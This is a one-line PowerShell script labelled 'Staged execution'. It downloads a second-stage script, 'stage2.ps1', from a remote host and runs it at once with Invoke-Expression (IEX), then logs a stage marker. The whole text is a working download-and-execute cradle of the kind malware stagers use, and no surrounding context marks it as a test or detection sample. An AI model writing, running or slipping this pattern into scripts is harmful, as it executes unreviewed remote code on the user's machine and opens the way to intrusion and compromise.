<# Staged execution #> $TargetUrl = "https://internal.corp/stage2.ps1"; IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing).Content; Write-Verbose "stage marker 25 reached"
